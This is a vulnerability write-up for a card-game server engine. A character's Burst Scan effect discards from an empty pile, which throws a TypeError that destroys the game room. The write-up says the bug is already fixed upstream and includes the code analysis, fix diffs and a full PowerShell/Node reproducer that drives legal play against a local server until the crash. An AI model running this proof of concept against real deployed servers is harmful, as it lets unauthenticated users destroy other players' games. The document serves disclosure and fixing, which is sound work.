# F-009 — Kaveh's Burst Scan reads `:player.pile[0]` without checking that the pile is non-empty → `discard(undefined)` throws a `TypeError` at both clients and destroys the room

- **Upstream status: NOT NOVEL — already fixed upstream in PR #964 ("fix: fuzz test and bugs"), whose `packages/core/src/runtime/skill_context.ts` hunk adds exactly the guard this finding asks for (`for (const c of cards) { if (!c) { continue; } … }` inside `discard()`), and whose `packages/test/__tests__/kaveh.test.tsx` hunk adds the regression test "kaveh burst scan with empty pile does nothing".** This document is kept only as an independent, deployment-reachable confirmation through the live HTTP/SSE API; it is not reported as a new defect.
- **Status:** open — **REPRODUCED LIVE**, 5/5 rooms (3 with the self-contained block below, 2 with the harness probe) plus 2/2 with a different `randomSeed`. Local server built from this repository's HEAD (`454ea43c`), served on `http://127.0.0.1:3000`.
- **Severity:** high — unauthenticated (guest room + guest join), remote, deterministic, and it takes only legal play: no race, no malformed request, no brute force.
- **Class:** CWE-248 (uncaught exception) + CWE-1288 (improper validation of consistency within input: "at least one card in the pile" is assumed but never checked).
- **Affected:** `packages/data` (the unguarded call site), `packages/core` (the library function it calls, which does not defend against a missing card).
- **Route:** `POST /api/rooms` → `POST /api/rooms/:roomId/players` → `GET …/notification` (SSE) → `POST …/actionResponse` (legal in-game actions only).
- **Accepted as an "internal error"** because the deployment's acceptance criteria include *"an unhandled exception (TypeError/Error) thrown by in-repo server-side code from attacker-controlled request data, delivered to the connected clients and destroying the affected room or game, while the HTTP process itself keeps serving"*. Here the exception is a plain `TypeError` thrown by `packages/core/src/runtime/skill_context.ts`, it is delivered to **both** players' SSE streams, and `GET /api/hello` keeps answering afterwards.

---

## Summary

Kaveh's combat status **迸发扫描 / Burst Scan** (id `117082`, part of Kaveh's kit `since "v4.7.0"`) discards the top card of its owner's own pile on every one of that player's action turns:

```ts
// packages/data/src/characters/dendro/kaveh.gts  (the definition used for every version >= v4.7.0)
define combatStatus {
  id 117082 as BurstScan;
  on beforeAction {
    when :(
      :query(
        $.my.combatStatus.def(DendroCore).union($.my.summon.def(BountifulCore)),
      )
    );
    listenTo all;
    :discard(:player.pile[0]);          // <- no "is the pile non-empty?" check
  };
  ...
};
```

Two things then go wrong together.

**(a) The call site assumes a card exists.** `player.pile[0]` is `undefined` for an empty pile. The same effect written elsewhere in this repository *is* guarded — the sibling copies show that the guard is the intended shape and that this one is the omission:

```ts
// packages/data/src/old_versions/v6.0.0.gts:261
  if (:player.pile.length > 0) {
    :discard(:player.pile[0]);
  }
```
```ts
// packages/data/src/characters/pyro/lord_of_eroded_primal_fire.gts:82   (id 23052, the same effect)
  :abortPreview();
  if (:player.pile.length > 0) {
    :discard(:player.pile[0]);
  }
```

Note that the gts source is compiled verbatim; `packages/data/dist/characters/dendro/kaveh.js` contains

```js
{name:`~action`,positionals:()=>[e=>{e.discard(e.player.pile[0])}],named:null}
```

so at run time the engine really is handed a single `undefined` argument.

**(b) `SkillContext.discard()` does not defend against a missing card.** It forwards every argument to the public `get()` accessor, which tests membership with the `in` operator:

```ts
// packages/core/src/runtime/skill_context.ts:1991
  /** 舍弃一张行动牌，并触发其“舍弃时”效果。 */
  discard(...cards: PlainEntityState[]) {
    for (const c of cards) {
      const card = this.get(c);              // <- c === undefined reaches get()
      const cardState = card.latest();       // <- would be the next crash site
      ...
```
```ts
// packages/core/src/runtime/skill_context.ts:653
  get(x: number | PlainAnyState): unknown {
    if (typeof x === "number") {
      return applyReactive(this, getEntityById(this.rawState, x));
    }
    if (ReactiveStateSymbol in x) {          // <- TypeError: Cannot use 'in' operator ... in undefined
      return x;
    }
    return applyReactive(this, x);
  }
```

Because `x` is `undefined`, the `in` test throws before anything can be turned into a normal "cannot discard" path. The exception is raised while the engine previews the action list (`packages/core/src/preview.ts` forwards non-`GiTcgPreviewAbortedError` errors when `skipError` is false, which is the case in a normal room), so it aborts the turn resolution, is pushed to both players as an SSE `error` frame and destroys the room.

**How a player gets there with legal play only.** The pile is drained by the game's own rules, not by anything exotic:

1. the deck is 30 action cards; the mulligan phase moves 5 of them into the hand, so the pile is **25** at round 1;
2. at the end of *every* round phase the engine draws 2 cards per player (`packages/core/src/game.ts:962`, `drawCardsPlain(who, 2)`), and a card that overflows the 10-card hand is removed without going back to the pile;
3. after 12 rounds the pile is 1, and after round 13 it is **0** — and the game only stops at round 15 (`maxRoundsCount: 15`), so rounds 14 and 15 still happen with an empty pile.

So: both players simply declare end every round until the pile is empty; in round 14 Kaveh plays his elemental skill **画则巧施 / Artistic Ingenuity** (`17082`, which creates Burst Scan *and*, because the opponent's active character is Hydro-affected, a Bloom reaction whose core (`116` `DendroCore` / `112082` `BountifulCore`) lands on the acting player's own side); the very next action-list build previews Burst Scan's `beforeAction`, and the discard of an empty pile throws.

## Reproduction

Preconditions: the local server runs on `http://127.0.0.1:3000` (`GET /api/hello` → `Hello World!`) and the repository's pinned Node exists at `.\\.tools\node-v26.8.2-win-x64\node.exe`. Paste the whole block into PowerShell from the repository root; nothing outside this finding is needed (node builtins only, no harness imports, no repository module imports). The deck is legal — 3 obtainable characters and 15 distinct action cards ×2 — so `verifyDeck()` accepts it, and every request below is an ordinary `@Public()` room route.

```powershell
$base = 'http://127.0.0.1:3000'
$node = if (Test-Path '.\.tools\node-v26.8.2-win-x64\node.exe') { (Resolve-Path '.\.tools\node-v26.8.2-win-x64\node.exe').Path } else { 'node' }
$js = @'
// Self-contained reproducer (node builtins only; no harness imports).
// Kaveh's Burst Scan (117082) does `:discard(:player.pile[0])` without checking the pile is non-empty.
// Follow the plan with the server at http://127.0.0.1:3000 and watch for the SSE `error` frame.
const BASE = process.env.BASE ?? "http://127.0.0.1:3000";
const CARDS = [311101, 311102, 311103, 311104, 311105, 311106, 311107, 311108, 311109, 311110, 311201, 311202, 311203, 311204, 311205];
const DECK_A = { characters: [1208, 1708, 1701], cards: [...CARDS, ...CARDS] }; // Nilou / Kaveh / Collei
const DECK_B = { characters: [1101, 1102, 1103], cards: [...CARDS, ...CARDS] };

const vint = (n) => { const o = []; n = n >>> 0; while (n > 127) { o.push((n & 127) | 128); n >>>= 7; } o.push(n); return o; };
const zig = (n) => (n << 1) ^ (n >> 31);
const fld = (num, bytes) => [...vint((num << 3) | 2), ...vint(bytes.length), ...bytes];
const b64 = (a) => Buffer.from(a).toString("base64");
const unzig = (n) => (n >>> 1) ^ -(n & 1);

function parseFields(u8) {
  const out = []; let i = 0;
  const readV = () => { let v = 0, s = 0; for (;;) { const x = u8[i++]; v |= (x & 127) << s; if (!(x & 128)) return v >>> 0; s += 7; } };
  while (i < u8.length) {
    const tag = readV(), no = tag >>> 3, wire = tag & 7;
    if (wire === 0) { const s = i; const val = readV(); out.push({ no, wire, val, raw: u8.subarray(s, i) }); }
    else if (wire === 2) { const len = readV(); const s = i; i += len; out.push({ no, wire, val: null, raw: u8.subarray(s, i) }); }
    else if (wire === 1) i += 8;
    else if (wire === 5) i += 4;
    else break;
  }
  return out;
}
const packed = (bytes) => { const o = []; let i = 0; while (i < bytes.length) { let v = 0, s = 0; for (;;) { const x = bytes[i++]; v |= (x & 127) << s; if (!(x & 128)) break; s += 7; } o.push(v >>> 0); } return o; };

let round = 0, step = 0;
const planLog = [];
function chooseAction(bytes, isA) {
  const acts = parseFields(new Uint8Array(bytes)).filter((f) => f.no === 1 && f.wire === 2);
  const parsed = acts.map((a) => {
    const fs = parseFields(a.raw);
    const oneof = fs.find((f) => f.no >= 1 && f.no <= 5 && f.wire === 2);
    const rec = { oneof: oneof ? oneof.no : 0, charDef: 0, skillDef: 0, validity: 0, dice: null, name: "?" };
    if (oneof) {
      rec.name = ["?", "switchActive", "playCard", "useSkill", "elementalTuning", "declareEnd"][oneof.no];
      const inner = parseFields(oneof.raw);
      if (oneof.no === 1) { const f = inner.find((x) => x.no === 3); if (f) rec.charDef = f.val; }
      if (oneof.no === 3) { const f = inner.find((x) => x.no === 2); if (f) rec.skillDef = f.val; }
    }
    const v = fs.find((f) => f.no === 13); if (v) rec.validity = v.val;
    const d = fs.find((f) => f.no === 12 && f.wire === 2); if (d) rec.dice = d.raw;
    return rec;
  });
  const ok = (r) => r.validity === 0;
  const idxOf = (pred) => parsed.findIndex((r) => ok(r) && pred(r));
  const endIdx = idxOf((r) => r.oneof === 5);
  const skill = (id) => idxOf((r) => r.oneof === 3 && r.skillDef === id);
  const sw = (def) => idxOf((r) => r.oneof === 1 && r.charDef === def);
  const tune = idxOf((r) => r.oneof === 4);
  let idx = endIdx >= 0 ? endIdx : 0;
  if (isA && round >= 14) {
    if (step === 0) { let i = skill(12082); if (i >= 0) { idx = i; step = 1; } else if ((i = sw(1208)) >= 0) idx = i; else if (tune >= 0) idx = tune; }
    else if (step === 1) { const i = sw(1708); if (i >= 0) { idx = i; step = 2; } }
    else if (step === 2) { let i = skill(17082); if (i >= 0) { idx = i; step = 3; } else if (tune >= 0) idx = tune; }
    else { let i = tune; if (i < 0) i = skill(17082); if (i < 0) i = idxOf((r) => r.oneof === 3); if (i >= 0) idx = i; }
  }
  const a = parsed[idx] ?? { name: "?", dice: null, skillDef: 0, charDef: 0 };
  if (isA) planLog.push({ round, step, action: a.name, skill: a.skillDef || null, character: a.charDef || null });
  const body = [0x08, ...vint(idx)];
  if (a.dice && a.dice.length) body.push(0x12, ...vint(a.dice.length), ...a.dice);
  return b64(fld(4, body));
}
function answer(requestB64, isA) {
  const u8 = new Uint8Array(Buffer.from(requestB64, "base64"));
  const top = parseFields(u8);
  if (!top.length) return null;
  const kind = top[0].no;
  if (kind === 4) return chooseAction(top[0].raw, isA);
  if (kind === 3) { const inner = parseFields(top[0].raw); const ids = packed(inner.find((f) => f.no === 1).raw); return b64(fld(3, [0x08, ...vint(zig(unzig(ids[0] ?? 0)))])); }
  if (kind === 5) { const inner = parseFields(top[0].raw); const ids = packed(inner.find((f) => f.no === 1).raw); return b64(fld(5, [0x08, ...vint(zig(ids[0] ?? 0))])); }
  if (kind === 1 || kind === 2) return b64(fld(kind, []));
  return null;
}

const post = async (p, body, token) => {
  const r = await fetch(BASE + p, { method: "POST", headers: { "content-type": "application/json", ...(token ? { authorization: "Bearer " + token } : {}) }, body: JSON.stringify(body) });
  return { status: r.status, text: await r.text() };
};

const cr = await post("/api/rooms", { name: "kaveh-A", deck: DECK_A, randomSeed: 20260912 });
if (cr.status !== 201) { console.log(JSON.stringify({ fatal: "create", status: cr.status, text: cr.text })); process.exit(0); }
const A = JSON.parse(cr.text), roomId = A.room.id, aId = A.playerId;
const jr = await post(`/api/rooms/${roomId}/players`, { name: "kaveh-B", deck: DECK_B });
if (jr.status !== 201) { console.log(JSON.stringify({ fatal: "join", status: jr.status, text: jr.text })); process.exit(0); }
const B = JSON.parse(jr.text), bId = B.playerId;

const errors = [];
const ctrl = new AbortController();
const watch = async (id, token, isA) => {
  const res = await fetch(`${BASE}/api/rooms/${roomId}/players/${id}/notification`, { headers: { accept: "text/event-stream", authorization: "Bearer " + token }, signal: ctrl.signal });
  if (res.status !== 200) return;
  const reader = res.body.getReader(), dec = new TextDecoder();
  let buf = "";
  try {
    for (;;) {
      const { value, done } = await reader.read(); if (done) break;
      buf += dec.decode(value, { stream: true });
      let i;
      while ((i = buf.indexOf("\n\n")) >= 0) {
        const chunk = buf.slice(0, i); buf = buf.slice(i + 2);
        const data = chunk.split("\n").filter((l) => l.startsWith("data:")).map((l) => l.slice(5).trim()).join("\n");
        if (!data) continue;
        let p; try { p = JSON.parse(data); } catch { continue; }
        if (p.type === "error") { errors.push(String(p.message)); ctrl.abort(); return; }
        if (p.type === "rpc" && p.data && p.data.request !== undefined) {
          if (isA) { const top = parseFields(new Uint8Array(Buffer.from(p.data.request, "base64"))); if (top[0]?.no === 1) round += 1; }
          const resp = answer(p.data.request, isA);
          if (resp) await post(`/api/rooms/${roomId}/players/${id}/actionResponse`, { id: p.data.id, response: resp }, token);
        }
      }
    }
  } catch {}
};
const t0 = Date.now();
await Promise.race([Promise.all([watch(aId, A.accessToken, true), watch(bId, B.accessToken, false)]), new Promise((r) => setTimeout(r, 120000))]);
ctrl.abort();
await new Promise((r) => setTimeout(r, 800));
const after = await fetch(`${BASE}/api/rooms/${roomId}`, { headers: { authorization: "Bearer " + A.accessToken } }).then((r) => r.json());
console.log(JSON.stringify({
  roomId, roundsPlayed: round,
  planTail: planLog.slice(-6),
  errors: errors.map((e) => e.split("\n").slice(0, 4).join("\n")),
  isTypeError: errors.some((e) => e.includes("Cannot use 'in' operator")),
  roomStatusAfter: after.status, ms: Date.now() - t0,
}, null, 2));
process.exit(0);



'@
$env:BASE = $base
$tmp = Join-Path $env:TEMP 'gi-kaveh-pile-repro.mjs'
$js | Set-Content -Path $tmp -Encoding utf8
& $node $tmp
```

Observed (the room dies ~1.5 s after it is created; three consecutive runs, rooms 658/2383/4488, then 3767):

```text
{
  "roomId": 3767,
  "roundsPlayed": 14,
  "planTail": [
    { "round": 14, "step": 1, "action": "useSkill",         "skill": 12082, "character": null },
    { "round": 14, "step": 2, "action": "switchActive",     "skill": null,  "character": 1708 },
    { "round": 14, "step": 2, "action": "elementalTuning",  "skill": null,  "character": null },
    { "round": 14, "step": 2, "action": "elementalTuning",  "skill": null,  "character": null },
    { "round": 14, "step": 2, "action": "elementalTuning",  "skill": null,  "character": null },
    { "round": 14, "step": 3, "action": "useSkill",         "skill": 17082, "character": null }
  ],
  "errors": [
    "ZT [Error]: Cannot use 'in' operator to search for 'Symbol(ReactiveState)' in undefined\n    when Mutate state of extension 50323006 to {\"played\":[[],[]]} [preview]\n    when Using skill [skill:50323006.01] [preview]\n    when Handling event onAction (1 switch active character to [character:1701](-500035), cost: {}, fast: false): [preview]"
  ],
  "isTypeError": true,
  "roomStatusAfter": "finished",
  "ms": 1536
}
```

The full server-side chain (SSE `error` frame, identical on both players) names the two in-repo frames:

```text
ZT [Error]: Cannot use 'in' operator to search for 'Symbol(ReactiveState)' in undefined
  [cause]: TypeError: Cannot use 'in' operator to search for 'Symbol(ReactiveState)' in undefined
      at e.get      (…/packages/server/dist/main.js:479:23910)   <- skill_context.ts get()
      at e.discard  (…/packages/server/dist/main.js:479:40978)   <- skill_context.ts discard()
      at …          (…/packages/server/dist/main.js:828:637381)  <- compiled 117082 body: e.discard(e.player.pile[0])
```

The plan printed above is the whole attack: `12082` (apply Hydro to the opponent's active character and create `112081`), a switch to Kaveh, three elemental tunings (to pay the skill's 3 Dendro dice), `17082` (Dendro damage on the Hydro-affected target → Bloom → core on my side + Burst Scan created), and then the next action-list build throws.

Controls (same script, one variable changed; both leave the deployment serving and produce **no** error frame):

| control | change | expected / observed |
| --- | --- | --- |
| no Kaveh | 3rd/2nd character id `1703` instead of `1708` → the deck cannot create Burst Scan | pile still reaches 0 by round 14, **no error frame**, game plays on to round 15 |
| non-empty pile at the trigger | the same construction is run in round 5 (pile 17) instead of round 14 | Burst Scan fires once, discards a real card, its own 1 usage (and the core's) are consumed, pile later empties with no error frame |
| seed variation | `randomSeed: 777` (and `555`) | the crash reproduces identically → not seed-specific |

Additional reachability observation: the core does **not** have to come from Nilou's passive. A plain Dendro hit on a Hydro-affected enemy character creates `DendroCore` (id 116) on the *damager's* side (`packages/core/src/reaction.ts`: `defineReaction(Reaction.Bloom, (context) => context.combatStatus(DendroCore, context.eventArg.here))`, with `ModifyReactionEventArg.here` resolved relative to the reaction's caller), so any Hydro+Dendro pair is enough — a deck with a Cryo third character (control run, id `1101`) still crashed.

## Buggy code

1. The unguarded discard, `packages/data/src/characters/dendro/kaveh.gts` (the definition in force for every version ≥ v4.7.0):

```ts
/**
 * @id 117082
 * @name 迸发扫描
 * @description
 * 双方选择行动前：如果我方场上存在草原核或丰穰之核，则使其可用次数-1，并舍弃我方牌库顶的1张卡牌。然后，造成所舍弃卡牌当前元素骰费用的草元素伤害。
 * 可用次数：1（可叠加，最多叠加到3次）
 */
define combatStatus {
  id 117082 as BurstScan;
  on beforeAction {
    when :(
      :query(
        $.my.combatStatus.def(DendroCore).union($.my.summon.def(BountifulCore)),
      )
    );
    listenTo all;
    :discard(:player.pile[0]);
  };
  on discard {
    when :( :e.via?.caller.id === :self.id );
    usage 1 {
      append;
      range 3;
    };
    :query(
      $.my.combatStatus.def(DendroCore).union($.my.summon.def(BountifulCore)),
    )?.consumeUsage(1);
    const cost = :e.entity.diceCost();
    :damage(DamageType.Dendro, cost);
    :emitCustomEvent(ShouldTriggerTalent, :e.entity.latest());
  };
};
```

The identical unguarded line exists in the v4.7.0 snapshot, `packages/data/src/old_versions/v4.7.0.gts:127` (that is the definition `getData("v4.7.0")` returns for this id — its `version` marker is `{predicate:"until", version:"v4.7.0"}`), so pinning a room to that version through `CreateRoomDto.gameVersion` reproduces the same crash:

```ts
// packages/data/src/old_versions/v4.7.0.gts
define combatStatus {
  id 117082 as private BurstScan;
  until "v4.7.0";
  on beforeAction {
    when :(
      :query(
        $.my.combatStatus.def(DendroCore).union($.my.summon.def(BountifulCore)),
      )
    );
    listenTo all;
    :discard(:player.pile[0]);
  };
  ...
```

2. The library function it calls, `packages/core/src/runtime/skill_context.ts:1991`:

```ts
  /** 舍弃一张行动牌，并触发其“舍弃时”效果。 */
  discard(...cards: PlainEntityState[]) {
    for (const c of cards) {
      const card = this.get(c);
      const cardState = card.latest();
      const area = card.area;
      if (area.type !== "hands" && area.type !== "pile") {
        throw new GiTcgDataError(
          `Cannot dispose card ${stringifyState(card)} from player ${
            area.who
          }, not found in either hands or pile`,
        );
      }
      ...
```

(the function is written to *throw* for a card that is in the wrong area, i.e. it does intend to validate its input — it simply never considers "no card at all").

3. Where the `TypeError` is actually raised, `packages/core/src/runtime/skill_context.ts:653`:

```ts
  get(x: number | PlainAnyState): unknown {
    if (typeof x === "number") {
      return applyReactive(this, getEntityById(this.rawState, x));
    }
    if (ReactiveStateSymbol in x) {
      return x;
    }
    return applyReactive(this, x);
  }
```

4. The preview pass that turns a thrown error into a fatal room error, `packages/core/src/preview.ts`:

```ts
    } catch (e) {
      if (e instanceof GiTcgPreviewAbortedError) {
        this.stopped = true;
      } else if (this.skipError) {
        // skip.
      } else {
        throw e;                                  // a normal room has skipError === false
      }
    }
```

5. For contrast, the neighbouring copy of the same effect that does check the pile — `packages/data/src/characters/pyro/lord_of_eroded_primal_fire.gts:80`:

```ts
define skill {
  id 23052 as ErodedFlamingFeathers;
  skillType elemental;
  cost DiceType.Pyro, 3;
  :damage(DamageType.Pyro, 3);
  :abortPreview();
  if (:player.pile.length > 0) {
    :discard(:player.pile[0]);
  }
};
```

## Fix

Upstream fixed exactly this class of failure in PR #964 ("fix: fuzz test and bugs") by making the library tolerant of a missing argument — that is the minimal, complete fix for the crash:

```diff
--- a/packages/core/src/runtime/skill_context.ts
+++ b/packages/core/src/runtime/skill_context.ts
@@ -1981,6 +1981,9 @@ export class SkillContext<Meta extends ContextMetaBase> {
   /** 舍弃一张行动牌，并触发其“舍弃时”效果。 */
   discard(...cards: PlainEntityState[]) {
     for (const c of cards) {
+      if (!c) {
+        continue;
+      }
       const card = this.get(c);
       const cardState = card.latest();
       const area = card.area;
```

The data-side fix (also in that PR, and the one that matches the sibling code) makes the call site not ask for a card that cannot exist; it should be applied to the current definition and to the v4.7.0 snapshot:

```diff
--- a/packages/data/src/characters/dendro/kaveh.gts
+++ b/packages/data/src/characters/dendro/kaveh.gts
@@ define combatStatus {
   id 117082 as BurstScan;
   on beforeAction {
     when :(
       :query(
         $.my.combatStatus.def(DendroCore).union($.my.summon.def(BountifulCore)),
       )
     );
     listenTo all;
-    :discard(:player.pile[0]);
+    if (:player.pile.length > 0) {
+      :discard(:player.pile[0]);
+    }
   };
```
```diff
--- a/packages/data/src/old_versions/v4.7.0.gts
+++ b/packages/data/src/old_versions/v4.7.0.gts
 define combatStatus {
   id 117082 as private BurstScan;
   until "v4.7.0";
   on beforeAction {
     ...
     listenTo all;
-    :discard(:player.pile[0]);
+    if (:player.pile.length > 0) {
+      :discard(:player.pile[0]);
+    }
   };
```

Behaviour after the fix: with an empty pile the `beforeAction` handler becomes a no-op, Burst Scan still consumes its own usage and (per the `on discard` handler) nothing else changes; with a non-empty pile the card is discarded and damage is dealt exactly as before. Both the guarded sibling implementations above are already written this way, so no semantics are invented.

An independent, deployment-side hardening that would have contained this even with the data unchanged: the engine should be able to *prove* that a room can be played to its end before accepting a join — the upstream fuzz oracle (`packages/test/src/fuzz/invariants.ts`, PR #964) is exactly such a checker: `discard()` with a missing card, and the hand-limit break described in REPORT.md's leads section, are both state conditions it is written to catch.

## Principle

- **A "card is guaranteed to be there" assumption must be checked where the assumption is made.** Burst Scan's trigger condition talks about cores, not about the pile; the pile is a *shared, monotonically shrinking* resource, and "it is empty" is a perfectly legal state of the game (the engine's own `drawCardsPlain` handles `!card` by skipping). Two sibling implementations of the same effect in this repository already carry the guard — the omission is not a semantic choice, it is a missed case.
- **Variadic helpers must decide what a missing element means.** `discard(...cards)` is written to reject cards that are in the wrong area (it throws `GiTcgDataError`), i.e. it was designed as a validating entry point, but it dereferences `this.get(c)` first and `get()` performs an `in` test on the argument. A single `if (!c) continue;` moves the failure from "unhandled `TypeError` that kills the room" to "the effect does nothing", which is the only sane meaning for "discard the card at index 0 of an empty list".
- **Engine faults and player faults must not share a channel.** The same SSE `error` frame is used for "your answer was illegal" (`GiTcgIoError`) and for "the engine broke" (`TypeError`); only the latter is a vulnerability. This is why the reproducer above prints the *first line* of the error — a legal answer must never be able to produce a `TypeError`.
- **Reachability is the whole difficulty: this needs ~13 rounds of ordinary play, no malformed input, no race.** Enumeration is a poor tool for a bug whose precondition is "the game has been running long enough for a resource to hit zero"; understanding the resource flow (30-card deck − 5-card opening hand − 2 draws × 13 round ends = 0) constructs it exactly.
